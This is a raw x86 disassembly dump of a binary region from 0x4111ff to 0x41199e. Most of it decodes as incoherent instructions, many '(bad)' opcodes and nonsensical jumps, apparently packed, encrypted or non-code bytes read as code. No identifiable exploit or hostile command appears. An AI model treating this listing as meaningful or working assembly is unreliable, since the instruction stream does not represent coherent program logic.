  4111ff:	mov    DWORD PTR ds:0x70449519,edx
  411205:	jo     0x411250
  411207:	jge    0x411279
  411209:	jo     0x411228
  41120b:	(bad)  
  41120d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41120e:	xchg   edx,eax
  41120f:	push   edi
  411210:	fdivr  st(0),st
  411212:	sub    eax,0xe14cbad6
  411217:	xchg   ebx,eax
  411218:	mov    al,0xe3
  41121a:	dec    esp
  41121b:	arpl   WORD PTR [eax+0x383a7e80],ax
  411221:	xchg   DWORD PTR [ecx+eiz*1+0x8],esp
  411225:	enter  0x2d4e,0x8c
  411229:	or     al,ah
  41122b:	les    edx,FWORD PTR [ebx+0x7f]
  41122e:	sub    ebx,DWORD PTR [eax]
  411230:	pusha  
  411231:	lock les ebx,FWORD PTR [edx+0x764af321]
  411238:	xor    eax,0x9c4cc003
  41123d:	hlt    
  41123e:	mov    esi,0xa16e2e68
  411243:	dec    edx
  411244:	sub    BYTE PTR [esi-0x4e9ec8f8],ah
  41124a:	fsubrp st(5),st
  41124c:	jae    0x411288
  41124e:	(bad)  
  41124f:	cmp    eax,0xbb94865d
  411254:	(bad)  
  411255:	(bad)  [edx]
  411257:	sbb    DWORD PTR [edi],edi
  411259:	or     al,0x71
  41125b:	push   ecx
  41125c:	mov    ah,BYTE PTR [ebp+0x617ec472]
  411262:	xchg   esi,eax
  411263:	or     al,0xc9
  411265:	xlat   BYTE PTR ds:[ebx]
  411266:	jle    0x411215
  411268:	mov    dl,0xd4
  41126a:	pop    esi
  41126b:	dec    esi
  41126c:	mov    dl,0x69
  41126e:	(bad)  
  41126f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411270:	dec    edx
  411271:	xor    cl,bh
  411273:	add    edi,ecx
  411275:	mov    dh,0xd6
  411277:	clc    
  411278:	push   esp
  411279:	lods   eax,DWORD PTR ds:[esi]
  41127a:	fcom   QWORD PTR [esi-0x28]
  41127d:	lahf   
  41127e:	push   es
  41127f:	shr    DWORD PTR [ecx],1
  411281:	add    ebp,edx
  411283:	push   esp
  411284:	push   ebp
  411285:	(bad)  
  411286:	xchg   edi,eax
  411287:	jno    0x41120a
  411289:	push   cs
  41128a:	fwait
  41128b:	dec    edx
  41128c:	sti    
  41128d:	ds aad 0x40
  411290:	inc    eax
  411291:	mov    bl,0x44
  411293:	cmp    esi,edx
  411295:	js     0x41129a
  411297:	ins    DWORD PTR es:[edi],dx
  411298:	pop    esp
  411299:	mov    al,ds:0x22c8c7de
  41129e:	sbb    edx,esi
  4112a0:	xor    dl,bh
  4112a2:	(bad)
  4112a6:	mov    bl,BYTE PTR [eax-0x76]
  4112a9:	scas   al,BYTE PTR es:[edi]
  4112aa:	mov    ebp,0xdbbeab5f
  4112af:	mov    ds:0xecfd1a90,al
  4112b4:	addr16 mov ch,0x9f
  4112b7:	sbb    al,0x1f
  4112b9:	sti    
  4112ba:	cmp    eax,0x4db38cc9
  4112bf:	push   ss
  4112c0:	push   edi
  4112c1:	into   
  4112c2:	ret    0x7867
  4112c5:	cmp    eax,0x349cc7ab
  4112ca:	pop    edi
  4112cb:	xchg   esp,eax
  4112cc:	jmp    0xe53db833
  4112d1:	clc    
  4112d2:	cs sub eax,0x7d23907f
  4112d8:	mov    dh,0x3d
  4112da:	xchg   esp,eax
  4112db:	bound  esi,QWORD PTR [edx]
  4112dd:	lea    edx,[ebx+0x1e]
  4112e0:	and    DWORD PTR [ebp-0x620ffee6],ebp
  4112e6:	jbe    0x41131e
  4112e8:	jmp    0x411369
  4112ea:	push   0x7e
  4112ec:	mov    WORD PTR [esi-0x5],?
  4112ef:	sub    eax,0xa3c11755
  4112f4:	data16 loopne 0x41127a
  4112f7:	push   eax
  4112f8:	fwait
  4112f9:	into   
  4112fa:	jmp    0x41133d
  4112fc:	push   cs
  4112fd:	or     BYTE PTR [ebp+0x42831dfb],al
  411303:	and    eax,0x6cb96076
  411308:	xor    al,0x7c
  41130a:	fsub   st(7),st
  41130c:	scas   al,BYTE PTR es:[edi]
  41130d:	pop    ds
  41130e:	xor    BYTE PTR [edi],al
  411310:	xchg   ebp,eax
  411311:	cmp    edx,esi
  411313:	loope  0x4112f3
  411315:	aam    0x71
  411317:	scas   al,BYTE PTR es:[edi]
  411318:	mov    edx,0x63a1452a
  41131e:	mov    ds:0x8b73224,eax
  411323:	mov    bl,BYTE PTR [ebx-0x33]
  411326:	sub    eax,0xf1905c62
  41132b:	pop    edi
  41132c:	rol    BYTE PTR [ebx-0x3676d935],1
  411332:	jne    0x4112d7
  411334:	mov    dl,0x59
  411336:	dec    edi
  411337:	pop    edi
  411338:	sub    DWORD PTR [eax+esi*8+0x36],edx
  41133c:	mov    es:0x12c614a2,eax
  411342:	inc    esi
  411343:	or     DWORD PTR [esi-0x7a1ef480],edx
  411349:	jle    0x41131c
  41134b:	xchg   sp,ax
  41134d:	fild   QWORD PTR [ebp-0x57]
  411350:	arpl   WORD PTR [ebx],ax
  411352:	mov    bh,BYTE PTR [eax]
  411354:	out    0x75,al
  411356:	popa   
  411357:	mov    ch,0x25
  411359:	out    dx,eax
  41135a:	lods   eax,DWORD PTR ds:[esi]
  41135b:	or     dl,BYTE PTR [eax+0x33]
  41135e:	xor    ah,BYTE PTR [ebp-0x9]
  411361:	lods   eax,DWORD PTR ds:[esi]
  411362:	scas   eax,DWORD PTR es:[edi]
  411363:	add    BYTE PTR ds:0x556c965d,ch
  411369:	inc    edi
  41136a:	ds push esp
  41136c:	dec    ecx
  41136d:	test   BYTE PTR [ebx],dh
  41136f:	icebp  
  411370:	mov    DWORD PTR [ebx-0x1a],0x662b094
  411377:	mov    dl,0xea
  411379:	mov    ah,0xea
  41137b:	out    dx,eax
  41137c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41137d:	add    ebp,DWORD PTR [esi-0x60]
  411380:	pop    ebp
  411381:	sbb    esi,DWORD PTR [esi+0x6d]
  411384:	(bad)  
  411385:	pop    ss
  411386:	jbe    0x411366
  411388:	out    0x9c,eax
  41138a:	mov    al,0x4c
  41138c:	sbb    cl,BYTE PTR [edi]
  41138e:	mov    dh,0x23
  411390:	or     ah,cl
  411392:	enter  0x55b7,0xbd
  411396:	xor    al,0x55
  411398:	xchg   edx,eax
  411399:	scas   al,BYTE PTR es:[edi]
  41139a:	xchg   DWORD PTR [edx+0x1c],esi
  41139d:	and    eax,0x30f7409d
  4113a2:	add    BYTE PTR [esi+0x57],0x34
  4113a6:	repnz stc 
  4113a8:	jae    0x4113e9
  4113aa:	push   ss
  4113ab:	retf   0xa4b5
  4113ae:	sar    dh,1
  4113b0:	mov    cl,0x6f
  4113b2:	aam    0x28
  4113b4:	imul   esp,DWORD PTR [eax],0x1b
  4113b7:	xor    al,0xa4
  4113b9:	jg     0x411388
  4113bb:	popa   
  4113bc:	and    BYTE PTR [edx],dh
  4113be:	mov    ah,0xd0
  4113c0:	in     eax,0x78
  4113c2:	add    al,0x2d
  4113c4:	xchg   DWORD PTR [edx+esi*4-0x1c],ebx
  4113c8:	xor    BYTE PTR [eax+0x52c59d2c],0xbf
  4113cf:	mov    edx,0xf476f51f
  4113d4:	sub    DWORD PTR [ebp-0x280b9b0c],ecx
  4113da:	cmp    al,0x54
  4113dc:	sbb    al,0x6a
  4113de:	mov    WORD PTR [ecx],gs
  4113e0:	bound  esp,QWORD PTR [edx]
  4113e2:	inc    ebp
  4113e3:	mov    bh,0xa7
  4113e5:	sub    ch,al
  4113e7:	retf   0xeb6
  4113ea:	mov    ds:0xa0f892ad,eax
  4113ef:	pop    ss
  4113f0:	lea    edx,[esi]
  4113f2:	xchg   esi,eax
  4113f3:	and    esi,edx
  4113f5:	inc    esp
  4113f6:	out    0x33,al
  4113f8:	(bad)
  4113fc:	inc    esi
  4113fd:	(bad)  
  4113fe:	and    cl,dl
  411400:	jmp    0xe1ebf52f
  411405:	jnp    0x411432
  411407:	cmp    eax,0xdebc1e8c
  41140c:	mov    dl,0x7b
  41140e:	test   DWORD PTR [ebx+0x9],edi
  411411:	sbb    BYTE PTR [edx],bl
  411413:	mov    dh,0x88
  411415:	sahf   
  411416:	(bad)  
  411417:	idiv   BYTE PTR [esp+eiz*8]
  41141a:	rcl    bl,1
  41141c:	jle    0x4113fc
  41141e:	xor    al,0x98
  411420:	mov    eax,ds:0x3419910d
  411425:	add    edx,DWORD PTR [esi]
  411427:	pop    ecx
  411428:	mov    esp,0x6fc39abd
  41142d:	push   cs
  41142e:	ins    DWORD PTR es:[edi],dx
  41142f:	pop    DWORD PTR cs:[esi]
  411432:	stos   DWORD PTR es:[edi],eax
  411433:	jno    0x411488
  411435:	iret   
  411436:	out    0x39,eax
  411438:	jmp    0x41148f
  41143a:	jae    0x41149b
  41143c:	dec    ebx
  41143d:	outs   dx,BYTE PTR ds:[esi]
  41143e:	std    
  41143f:	mov    ecx,DWORD PTR [edx]
  411441:	mov    dl,0x24
  411443:	loop   0x41148b
  411445:	inc    bl
  411447:	fadd   QWORD PTR [ecx+0x564f7063]
  41144d:	sti    
  41144e:	aad    0xe2
  411450:	gs lock int 0x27
  411454:	pop    ss
  411455:	or     eax,0x8189a5e7
  41145a:	xchg   ebp,eax
  41145b:	push   ss
  41145c:	or     al,0xa2
  41145e:	pop    ecx
  41145f:	jmp    0x411444
  411461:	dec    edi
  411462:	inc    eax
  411463:	add    BYTE PTR [edx+0x4d],cl
  411466:	aas    
  411467:	sti    
  411468:	add    DWORD PTR [eax-0x61258250],esi
  41146e:	(bad)  
  41146f:	pushf  
  411470:	jmp    0x4114e4
  411472:	ja     0x41141a
  411474:	sub    BYTE PTR [ebx-0x4d],cl
  411477:	retf   0xbeef
  41147a:	bound  edi,QWORD PTR [eax-0x1]
  41147d:	sub    ebp,DWORD PTR [eax]
  41147f:	in     eax,dx
  411480:	or     al,0xd2
  411482:	or     BYTE PTR [ecx],al
  411484:	bound  esi,QWORD PTR [ebx-0x1cd5367f]
  41148a:	popf   
  41148b:	adc    eax,0xa6dbef27
  411490:	pop    esp
  411491:	adc    BYTE PTR [eax+edx*2],dl
  411494:	xor    edx,DWORD PTR [ebx+eax*2]
  411497:	push   0x8afdc7fb
  41149c:	idiv   BYTE PTR [edx+0x28147163]
  4114a2:	int    0xdb
  4114a4:	inc    edx
  4114a5:	pop    ebp
  4114a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114a8:	arpl   WORD PTR [eax],sp
  4114aa:	push   edx
  4114ab:	sub    eax,0x350f7f4
  4114b0:	jo     0x41147c
  4114b2:	pushf  
  4114b3:	lock jp 0x411534
  4114b6:	dec    ebp
  4114b7:	arpl   WORD PTR [edi+ecx*4+0x5488f2ab],bx
  4114be:	int3   
  4114bf:	nop
  4114c0:	std    
  4114c1:	xchg   ebx,eax
  4114c2:	std    
  4114c3:	fs adc edx,ecx
  4114c6:	aad    0x9f
  4114c8:	or     al,0x1d
  4114ca:	cli    
  4114cb:	mov    gs,eax
  4114cd:	ror    BYTE PTR [edi-0x3d],0xb6
  4114d1:	jl     0x41149f
  4114d3:	das    
  4114d4:	loopne 0x411541
  4114d6:	mov    eax,ds:0x12524e3e
  4114db:	inc    edi
  4114dc:	and    WORD PTR [ebx],sp
  4114df:	cmp    esi,esi
  4114e1:	arpl   WORD PTR [ebx],cx
  4114e3:	cdq    
  4114e4:	cwde   
  4114e5:	push   ds
  4114e6:	mov    DWORD PTR [edi+0x5f],edx
  4114e9:	daa    
  4114ea:	ins    BYTE PTR es:[edi],dx
  4114eb:	inc    esp
  4114ec:	(bad)  
  4114ed:	dec    ecx
  4114ee:	push   edx
  4114ef:	inc    esp
  4114f0:	push   esi
  4114f1:	loopne 0x4114ee
  4114f3:	push   0x7f
  4114f5:	push   esp
  4114f6:	jp     0x41153a
  4114f8:	xchg   edx,eax
  4114f9:	shr    BYTE PTR [edi+0x754e4ea3],0xa
  411500:	sbb    esi,DWORD PTR gs:[ebx+0x69]
  411504:	jo     0x411533
  411506:	mov    ebp,0x45fdb451
  41150b:	fld1   
  41150d:	je     0x411550
  41150f:	dec    ebp
  411510:	outs   dx,DWORD PTR ds:[esi]
  411511:	mov    ds:0x8ddf03da,al
  411516:	fadd   QWORD PTR [ebp+0x62ae7289]
  41151c:	mov    edi,0x8439bd0d
  411521:	mov    eax,0xe5f94cbe
  411526:	cmp    ecx,DWORD PTR [edi]
  411528:	push   ss
  411529:	retf   
  41152a:	int3   
  41152b:	ficom  DWORD PTR [ebx]
  41152d:	adc    eax,0x8ef82790
  411532:	dec    eax
  411533:	push   ds
  411534:	mov    edx,0x9e0e3743
  411539:	in     eax,0xb7
  41153b:	int    0x9f
  41153d:	push   cs
  41153e:	loopne 0x411533
  411540:	and    BYTE PTR [esi],0xd4
  411543:	pop    ss
  411544:	neg    edi
  411546:	out    0x34,al
  411548:	(bad)  
  411549:	jmp    0xdc5192fe
  41154e:	rcr    BYTE PTR [ecx+0x72],cl
  411551:	daa    
  411552:	leave  
  411553:	mov    DWORD PTR [ecx],ecx
  411555:	in     eax,dx
  411556:	jnp    0x41157d
  411558:	xlat   BYTE PTR ds:[ebx]
  411559:	pusha  
  41155a:	xchg   BYTE PTR [edi+0x40],dh
  41155d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41155e:	lds    ebp,FWORD PTR [ebx-0x3c]
  411561:	fnstsw WORD PTR [ecx]
  411563:	into   
  411564:	aad    0xeb
  411566:	lea    eax,[ecx+0x64]
  411569:	mov    dl,0x54
  41156b:	xchg   esp,eax
  41156c:	inc    edi
  41156d:	rcr    ebp,cl
  41156f:	and    BYTE PTR ds:0xcd9f35e3,dh
  411575:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411576:	adc    BYTE PTR [eax-0x7c],0x62
  41157a:	mov    ch,0x4c
  41157c:	and    esp,ecx
  41157e:	mov    ds:0x12b8ea86,al
  411583:	or     DWORD PTR [edx+ebx*4+0x36],ebx
  411587:	lahf   
  411588:	test   BYTE PTR [edx+ebp*4-0x49365856],0x35
  411590:	inc    edi
  411591:	adc    ecx,edi
  411593:	add    eax,ebp
  411595:	adc    eax,0x2d64219
  41159a:	adc    dl,BYTE PTR [esi+0x1756dab5]
  4115a0:	shl    esi,1
  4115a2:	test   eax,0xa80f0e89
  4115a7:	jae    0x411611
  4115a9:	ror    bl,1
  4115ab:	mov    dl,0x35
  4115ad:	adc    BYTE PTR [ebx+ebx*2+0x21],0x4c
  4115b2:	stos   BYTE PTR es:[edi],al
  4115b3:	xor    DWORD PTR [edi+eax*4],0x7940a2e3
  4115ba:	rcl    DWORD PTR [eax],cl
  4115bc:	cdq    
  4115bd:	mov    esi,0x87f3cb6b
  4115c2:	xchg   ebp,eax
  4115c3:	cmc    
  4115c4:	nop
  4115c5:	mov    ebx,0xb2d0aca9
  4115ca:	(bad)  
  4115cb:	mov    ebp,0xd6f74afb
  4115d0:	or     ebp,DWORD PTR [esi+0x6f5db407]
  4115d6:	test   ch,ah
  4115d8:	repnz sbb DWORD PTR ds:0xd11ced04,ebx
  4115df:	ret    
  4115e0:	inc    edx
  4115e1:	mov    edx,DWORD PTR [ebp+0x14]
  4115e4:	xor    eax,ecx
  4115e6:	add    eax,esi
  4115e8:	imul   eax,DWORD PTR [edx]
  4115eb:	mov    edx,DWORD PTR [ebp-0x4]
  4115ee:	xor    edx,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4115f3:	lea    ecx,[edx+ecx*1+0x32729c]
  4115fa:	cmp    ecx,eax
  4115fc:	jmp    0x4119f0
  411601:	mov    ebx,0x93838448
  411606:	push   ebx
  411607:	mov    ebx,0x78da0248
  41160c:	bound  edi,QWORD PTR [ecx+0x9]
  41160f:	bound  edx,QWORD PTR [esi+ebp*8+0x49707040]
  411616:	jge    0x411688
  411618:	jo     0x411620
  41161a:	xor    al,0x5b
  41161c:	stos   DWORD PTR es:[edi],eax
  41161d:	loopne 0x4115a0
  41161f:	ret    0x82ea
  411622:	xlat   BYTE PTR ds:[ebx]
  411623:	js     0x41162b
  411625:	xchg   DWORD PTR fs:[ebx+0x25a65ac2],esp
  41162c:	push   ds
  41162d:	mov    ds:0xa07be201,al
  411632:	dec    esi
  411633:	ins    DWORD PTR es:[edi],dx
  411634:	std    
  411635:	repz ja 0x4115c3
  411638:	sub    dl,BYTE PTR ds:0x2f6c230c
  41163e:	or     al,0xbd
  411640:	push   esp
  411641:	dec    eax
  411642:	outs   dx,DWORD PTR ds:[esi]
  411643:	mov    al,ds:0xa4f62c7
  411648:	pop    edx
  411649:	xor    ch,BYTE PTR [ebp-0x12]
  41164c:	mov    DWORD PTR [ecx],0xd7ad0446
  411652:	push   ds
  411653:	fbstp  TBYTE PTR [esi+0x3d]
  411656:	clc    
  411657:	cmp    dh,ch
  411659:	jmp    0x8ba3a472
  41165e:	cmp    bh,BYTE PTR [eax]
  411660:	inc    esi
  411661:	pop    es
  411662:	and    ch,al
  411664:	sub    al,0x11
  411666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411667:	add    eax,0x5a63d79a
  41166c:	jle    0x4116c3
  41166e:	cdq    
  41166f:	in     al,dx
  411670:	lea    edi,[esi+0x608ea171]
  411676:	stos   DWORD PTR es:[edi],eax
  411677:	(bad)  
  411678:	(bad)  
  41167a:	pop    ecx
  41167b:	bound  ecx,QWORD PTR [edx]
  41167d:	dec    ecx
  41167e:	xchg   ebx,eax
  41167f:	aaa    
  411680:	mov    eax,0x9497777a
  411685:	mov    dh,0xfa
  411687:	retf   
  411688:	loopne 0x411615
  41168a:	cwde   
  41168b:	cmp    al,0xfe
  41168d:	cs (bad) 
  41168f:	jecxz  0x411705
  411691:	stos   BYTE PTR es:[edi],al
  411692:	or     bh,BYTE PTR [ebx+0x45914b4a]
  411698:	dec    edx
  411699:	mov    ch,0xb4
  41169b:	mov    dl,0x9f
  41169d:	mov    bh,ch
  41169f:	adc    BYTE PTR [edx-0x1],0xbe
  4116a3:	pop    eax
  4116a4:	push   es
  4116a5:	ins    DWORD PTR es:[edi],dx
  4116a6:	sbb    BYTE PTR ds:0xee5d51d8,0x4
  4116ad:	mov    edx,0xa13ce0cb
  4116b2:	cli    
  4116b3:	cmc    
  4116b4:	pop    ds
  4116b5:	or     al,0xfa
  4116b7:	bound  ecx,QWORD PTR [esi]
  4116b9:	pop    edi
  4116ba:	lds    edi,FWORD PTR [esi-0x20]
  4116bd:	daa    
  4116be:	fstp   QWORD PTR [ebx]
  4116c0:	pop    edx
  4116c2:	mov    esp,DWORD PTR [edx+eax*1]
  4116c5:	rcl    DWORD PTR ds:0xc9125b57,cl
  4116cb:	es jbe 0x41166e
  4116ce:	xchg   edx,eax
  4116cf:	mov    ds:0x88772153,al
  4116d4:	push   ss
  4116d5:	adc    eax,0x2a416d28
  4116da:	fwait
  4116db:	outs   dx,DWORD PTR ds:[esi]
  4116dc:	xor    al,0xd2
  4116de:	pop    esi
  4116df:	or     eax,0xfafc837e
  4116e4:	add    bl,dl
  4116e6:	push   ecx
  4116e7:	loope  0x411679
  4116e9:	mov    dh,0x41
  4116eb:	adc    BYTE PTR [edx+0x588138c7],dh
  4116f1:	sub    ch,0x90
  4116f4:	out    0x1,al
  4116f6:	cdq    
  4116f7:	invd   
  4116f9:	adc    dl,BYTE PTR [esi+0x2c]
  4116fc:	xor    ch,al
  4116fe:	rol    DWORD PTR [ebx],1
  411700:	push   eax
  411701:	mov    eax,ds:0xf745f9ea
  411706:	mov    edx,0x4b79781e
  41170b:	mov    ss,WORD PTR [edx+0x6ab15d29]
  411711:	cmp    edx,DWORD PTR ds:0x36c5e652
  411717:	mov    edi,0xcaf932d
  41171c:	pslld  mm1,QWORD PTR [ecx]
  41171f:	inc    ebx
  411720:	aas    
  411721:	adc    dl,dh
  411723:	fdiv   DWORD PTR [edx+0x7d]
  411726:	loop   0x4116e9
  411728:	dec    esp
  411729:	push   ebp
  41172a:	neg    DWORD PTR es:[esi+0x11e03170]
  411731:	mov    bh,0x45
  411733:	gs inc edx
  411735:	push   ebp
  411736:	scas   eax,DWORD PTR es:[edi]
  411737:	(bad)  
  411738:	push   edx
  411739:	or     eax,0x1826ee0e
  41173e:	mov    eax,ds:0x218b30b1
  411743:	xor    ebx,DWORD PTR [esi-0x47]
  411746:	js     0x411770
  411748:	mov    cl,0x4
  41174a:	repz in al,dx
  41174c:	jg     0x411721
  41174e:	xchg   edx,eax
  41174f:	xchg   ecx,eax
  411750:	out    dx,al
  411751:	test   eax,0xc570394d
  411756:	pop    es
  411757:	push   esp
  411758:	lock cli 
  41175a:	adc    BYTE PTR [edx+0x2f],0x81
  41175e:	push   ebx
  41175f:	or     bl,bh
  411761:	pop    ecx
  411762:	clc    
  411763:	push   cs
  411764:	sub    ebp,DWORD PTR [esp+ebp*2-0x33b56c7b]
  41176b:	mov    edi,0xe144010c
  411770:	jae    0x41174f
  411772:	mov    WORD PTR [edx+0xe6a48a1],cs
  411778:	jnp    0x4117a4
  41177a:	(bad)  
  41177c:	mov    WORD PTR ds:0xa5eef050,cs
  411782:	xor    bh,al
  411784:	adc    ebp,DWORD PTR [edi+0x6a]
  411787:	xchg   ebp,eax
  411788:	add    eax,0x70a4043e
  41178d:	fidiv  WORD PTR [esi+eiz*1]
  411790:	rcr    ch,1
  411792:	rcr    DWORD PTR [edi-0x2c],0x42
  411796:	mov    ch,0x7e
  411798:	push   ebx
  411799:	push   esp
  41179a:	into   
  41179b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41179c:	ins    DWORD PTR es:[edi],dx
  41179d:	mov    ebp,0x65f6a51c
  4117a2:	inc    eax
  4117a3:	jae    0x4117e1
  4117a5:	les    edi,FWORD PTR [edi]
  4117a7:	mov    ebx,0xf2b94b61
  4117ac:	loop   0x41182c
  4117ae:	sub    ecx,edi
  4117b0:	add    al,0xd3
  4117b2:	adc    dl,ah
  4117b4:	push   0xa6392e52
  4117b9:	outs   dx,DWORD PTR ds:[esi]
  4117ba:	push   ebx
  4117bb:	in     al,0x4e
  4117bd:	fcomp  QWORD PTR [ebp+0x38]
  4117c0:	dec    ebp
  4117c1:	push   ss
  4117c2:	sti    
  4117c3:	stos   DWORD PTR es:[edi],eax
  4117c4:	cld    
  4117c5:	pop    eax
  4117c6:	push   eax
  4117c7:	cmp    al,0xb9
  4117c9:	mov    esi,0x19c26e48
  4117ce:	in     eax,0x60
  4117d0:	sbb    esp,DWORD PTR [eax+0x5f]
  4117d3:	in     al,dx
  4117d4:	sbb    BYTE PTR [ebx],ah
  4117d6:	loop   0x4117b3
  4117d8:	and    DWORD PTR [ecx],edi
  4117da:	and    al,0x92
  4117dc:	das    
  4117dd:	or     dl,al
  4117df:	scas   al,BYTE PTR es:[edi]
  4117e0:	loope  0x411783
  4117e2:	or     edi,esp
  4117e4:	fcmovb st,st(1)
  4117e6:	sti    
  4117e7:	or     BYTE PTR [ebx],bl
  4117e9:	in     eax,dx
  4117ea:	cld    
  4117eb:	ror    BYTE PTR [esp+ebx*8+0x39],0xac
  4117f0:	int3   
  4117f1:	ds in  al,dx
  4117f3:	and    ch,BYTE PTR [esi+0x725d0b0d]
  4117f9:	cmp    eax,esi
  4117fb:	leave  
  4117fc:	cld    
  4117fd:	adc    eax,0xc3a183ea
  411802:	push   esi
  411803:	push   eax
  411804:	(bad)  
  411806:	test   al,0x62
  411808:	mul    DWORD PTR [esi]
  41180a:	and    BYTE PTR [eax+0x37],0x0
  41180e:	cmp    eax,0x3ef2186f
  411813:	cld    
  411814:	(bad)  
  411815:	mov    bh,0x81
  411817:	push   ecx
  411818:	(bad)  
  411819:	and    edx,DWORD PTR [esi+0x453669a2]
  41181f:	inc    eax
  411820:	ret    
  411821:	out    0x81,al
  411823:	push   ss
  411824:	sbb    eax,0x8f7c07d1
  411829:	sbb    edx,DWORD PTR [edx]
  41182b:	sub    eax,0xc097a4aa
  411830:	out    dx,al
  411831:	ret    
  411832:	fwait
  411833:	mov    ah,al
  411835:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411836:	cmp    BYTE PTR [ecx+0x26545027],dh
  41183c:	daa    
  41183d:	cmp    al,0x93
  41183f:	test   bl,al
  411841:	jg     0x41189b
  411843:	jle    0x411841
  411845:	or     BYTE PTR [ebx+0x2a],0x29
  411849:	test   DWORD PTR [ebx],ebx
  41184b:	or     ah,ah
  41184d:	mov    ah,0x2
  41184f:	xchg   edx,eax
  411850:	mov    dh,0x17
  411852:	jp     0x411815
  411854:	sahf   
  411855:	fcmovne st,st(1)
  411857:	(bad)  
  411858:	stc    
  411859:	outs   dx,BYTE PTR ds:[esi]
  41185a:	dec    eax
  41185b:	in     eax,dx
  41185c:	inc    eax
  41185d:	sub    BYTE PTR [edx+0x63b2746a],dh
  411863:	pop    esp
  411864:	xor    cl,dh
  411866:	mov    esi,0x3b0f4f
  41186b:	paddsb mm2,QWORD PTR [edi+0x1964f468]
  411872:	in     al,0x71
  411874:	xchg   ebp,eax
  411875:	into   
  411876:	xchg   DWORD PTR [esi+0x78990cc1],edx
  41187c:	bound  ebx,QWORD PTR [edi+0x29e56b7f]
  411882:	inc    edx
  411883:	fmul   DWORD PTR [ecx+0x21]
  411886:	fcomp  DWORD PTR [ebp-0x4f]
  411889:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41188a:	neg    DWORD PTR [edx-0x3e]
  41188d:	daa    
  41188e:	mov    dh,0xa
  411890:	or     al,0x50
  411892:	jp     0x41188f
  411894:	mov    edi,0xa00b3f87
  411899:	jae    0x411860
  41189b:	inc    esi
  41189c:	shl    DWORD PTR [ebx+edi*4-0x4c],1
  4118a0:	cmp    dh,BYTE PTR [ebx]
  4118a2:	out    0x59,eax
  4118a4:	xchg   BYTE PTR [eax+ecx*8],al
  4118a7:	repz mov ecx,0xafcbcfc0
  4118ad:	repz xor BYTE PTR [edx],dh
  4118b0:	cmp    bl,BYTE PTR ds:0x779c9ba4
  4118b6:	nop
  4118b7:	pop    esi
  4118b8:	inc    eax
  4118b9:	push   ebp
  4118ba:	int    0x59
  4118bc:	push   ebx
  4118bd:	sub    DWORD PTR [edx+0x52],ebp
  4118c0:	fcmovbe st,st(5)
  4118c2:	(bad)  
  4118c3:	mov    ebx,0x3534ce51
  4118c8:	out    dx,eax
  4118c9:	(bad)  
  4118ca:	mov    ebp,0xa9889e6a
  4118cf:	clc    
  4118d0:	icebp  
  4118d1:	bound  edx,QWORD PTR [ecx-0x45]
  4118d4:	jnp    0x411929
  4118d6:	loope  0x4118a8
  4118d8:	icebp  
  4118d9:	pop    ds
  4118da:	mov    al,ds:0x88523d0a
  4118df:	(bad)  
  4118e0:	ret    0xc793
  4118e3:	inc    esi
  4118e4:	loop   0x4118e8
  4118e6:	xor    edi,esi
  4118e8:	push   ebx
  4118e9:	popa   
  4118ea:	mov    ah,0x5
  4118ec:	xlat   BYTE PTR ds:[ebx]
  4118ed:	das    
  4118ee:	push   cs
  4118ef:	ja     0x4118f4
  4118f1:	jecxz  0x411967
  4118f3:	sub    DWORD PTR [esi-0x3],eax
  4118f6:	stos   BYTE PTR es:[edi],al
  4118f7:	out    dx,eax
  4118f8:	in     eax,0x19
  4118fa:	js     0x41196f
  4118fc:	ss inc ebx
  4118fe:	add    al,0xd
  411900:	or     BYTE PTR [ebx+0x3a],cl
  411903:	data16 sar BYTE PTR [eax-0xe560057],cl
  41190a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41190b:	jl     0x411907
  41190d:	imul   BYTE PTR [ecx-0x7ab9a641]
  411913:	cwde   
  411914:	enter  0x6394,0x46
  411918:	cmc    
  411919:	mov    DWORD PTR [ebx+0x19b24e34],edx
  41191f:	sbb    al,0x8b
  411921:	repnz jecxz 0x411965
  411924:	add    eax,0x5820588a
  411929:	scas   al,BYTE PTR es:[edi]
  41192a:	nop
  41192b:	dec    esp
  41192c:	stos   DWORD PTR es:[edi],eax
  41192d:	pusha  
  41192e:	jo     0x41194a
  411930:	scas   eax,DWORD PTR es:[edi]
  411931:	xchg   DWORD PTR [esi-0xd],esp
  411934:	jae    0x411972
  411936:	and    ch,BYTE PTR [edx-0x3dd5e5ea]
  41193c:	or     BYTE PTR [eax-0x40],ch
  41193f:	xor    dh,BYTE PTR [ecx+0x45]
  411942:	lods   al,BYTE PTR ds:[esi]
  411943:	inc    edx
  411944:	jmp    0x6f56:0x62d6f94d
  41194b:	inc    esi
  41194c:	inc    eax
  41194d:	cdq    
  41194e:	out    dx,eax
  41194f:	ins    BYTE PTR es:[edi],dx
  411950:	call   0xe24f:0x4ff9074
  411957:	cmp    dh,bh
  411959:	pushf  
  41195a:	sub    BYTE PTR [ebx],cl
  41195c:	js     0x4119b6
  41195e:	ja     0x411942
  411960:	jmp    0x1dc72edd
  411965:	pop    eax
  411966:	adc    BYTE PTR [ebx],dl
  411968:	pop    esi
  411969:	mov    edi,0x847be222
  41196e:	ins    DWORD PTR es:[edi],dx
  41196f:	ds out dx,al
  411971:	outs   dx,DWORD PTR ds:[esi]
  411972:	jle    0x4119f2
  411974:	sub    edx,DWORD PTR [edi-0x54]
  411977:	pop    sp
  411979:	and    eax,0x8374f93c
  41197e:	sub    BYTE PTR [ecx],bl
  411980:	adc    al,0xfe
  411982:	aam    0x44
  411984:	aad    0xd3
  411986:	xchg   BYTE PTR [esi+ebx*8-0x3],bl
  41198a:	int3   
  41198b:	rcl    BYTE PTR [eax+ebx*4],1
  41198e:	cmp    eax,0x6ac22236
  411993:	stc    
  411994:	or     DWORD PTR ds:0x9dc3e51f,esp
  41199a:	std    
  41199b:	lods   al,BYTE PTR ds:[esi]
  41199c:	inc    edi
  41199d:	popa   
  41199e:	cmp    DWORD PTR [eax+ebp*8+0x32],edx
